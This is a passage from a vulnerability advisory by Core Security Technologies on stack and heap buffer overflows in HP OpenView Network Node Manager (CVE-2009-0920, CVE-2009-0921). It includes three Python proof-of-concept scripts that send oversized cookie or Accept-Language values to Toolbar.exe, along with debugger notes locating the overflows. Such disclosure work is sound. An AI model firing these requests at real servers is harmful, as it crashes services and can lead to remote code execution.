information [5].


6. *Credits*

These vulnerabilities were discovered and researched by Oren Isacson
from Core Security Technologies.


7. *Technical Description / Proof of Concept Code*

Several buffer overflows have been found in HP OpenView Network Node
Manager, which can be exploited to remotely compromise a user's system.

While working on an exploit for the vulnerabilities disclosed in the
advisory [3], three bugs were found. The stack-based bug found on CGI
parameter 'OvOSLocale' is similar to one of the bugs previously reported
in [3] whereas the two heap-based bugs are different vulnerabilities.

Versions 7.51, 7.53, and 7.53 with patch NNM_01195 were tested and all
of them were vulnerable. The two heap-based buffer overflows are
different vulnerabilities from those exposed publicly on CVE-2008-0067
because the vulnerabilities are not fixed with patch NNM_01195 and are
not mentioned on published advisories.

CVE identification code CVE-2009-0920 was assigned to the
unpatched/variant stack-based overflow related to CVE-2008-0067, and
CVE-2009-0921 was assigned for the two heap overflows. Bugtraq IDs
(BIDs) were assigned: 34134 for 'OvAcceptLang' parameter bug; and 34135
for the 'Accept-Language' HTTP header bug.


7.1. *Stack-based overflow (CVE-2009-0920)*

It is important to remark that the stack-based bug on parameter
'OvOSLocale', that we assumed to be mentioned on published advisories,
is not fixed by the previous patch NNM_01195. Proof of concept follows.

/-----------

import socket,sys
if len(sys.argv)!=3:
    print "USAGE:OvOSLocale.py server port"
else:
    req="GET /OvCgi/Toolbar.exe HTTP/1.0\nCookie:
OvOSLocale=en_US"+'a'*1400+"; OvAcceptLang=en-usa\n\n"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #s.connect(('127.0.0.1',80))
    s.connect((sys.argv[1],int(sys.argv[2])))
    s.send(req)
    print s.recv(4000)

- -----------/

 A debugger was used on a Windows system to see where the 'OvOSLocale'
overflow is located. The call stack shows that '_OVresetLangEnv' in
'ovutil.dll' calls 'ov.sprintf_new' in 'ov.dll' that calls '_vsnprintf'
in 'msvcrt.dll'. The destination buffer of the '_vsnprintf' is located
on the stack, the count is 0x7fff, the format is 'OV_LANG=%s', and the
string is too large for the stack buffer, causing the stack overflow. A
new CVE name was assigned, CVE-2009-0920, marking this bug as unfixed or
variant.


7.2. *Heap-based overflow (CVE-2009-0921, BID 34134)*

Sending HTTP requests to the 'Toolbar.exe' application with large
'OvAcceptLang' cookies causes a buffer overflow. For example the
following Python program causes an access violation on 'Toolbar.exe' if
executed on a windows machine running NNM Admin. The return code of the
web server is '502', signaling an error on the CGI application. Using
similar requests, remote code execution is possible. 'Toolbar.exe' is
just an exploitation path; in the case of parameter 'OvAcceptLang' the
bug is actually located on 'ov.dll' (i.e. on Windows).

/-----------

import socket,sys
if len(sys.argv)!=3:
    print "USAGE:OvAcceptLang.py server port"
else:
    req="GET /OvCgi/Toolbar.exe HTTP/1.0\nCookie: OvOSLocale=en_US;
OvAcceptLang=en-usa"+'a'*1400+"\n\n"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((sys.argv[1],int(sys.argv[2])))
    s.send(req)
    print s.recv(4000)

- -----------/

 A debugger was also used to see where the 'OvAcceptLang' overflow is
located. The program being debugged is 'Toolbar.exe'. This is the call
stack of the '_vsnprintf' function that we think causes the overflow. It
can be seen that the real culprit is located in ovwww.dll. A call is
made to 'sprintf_new' with a destination buffer located in the heap that
is too small to hold the written string.

7.3. *Heap-based overflow (CVE-2009-0921, BID 34135)*

When sending a large 'Accept-Language' HTTP header another heap buffer
is overflowed. This vulnerability could also be used to obtain remote
code execution. On Solaris, the bug is located inside 'libovwww.so.4'
and on Windows inside 'ovwww.dll'.

/-----------

import socket,sys
if len(sys.argv)!=3:
    print "USAGE:AcceptLanguage.py server port"
else:
    req="POST /OvCgi/Toolbar.exe HTTP/1.0\nAccept-Language:
"+'a'*1400+"\nContent-Length:0\nHost:192.168.22.252\n\n"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((sys.argv[1],int(sys.argv[2])))
    s.send(req)
    print s.recv(4000)
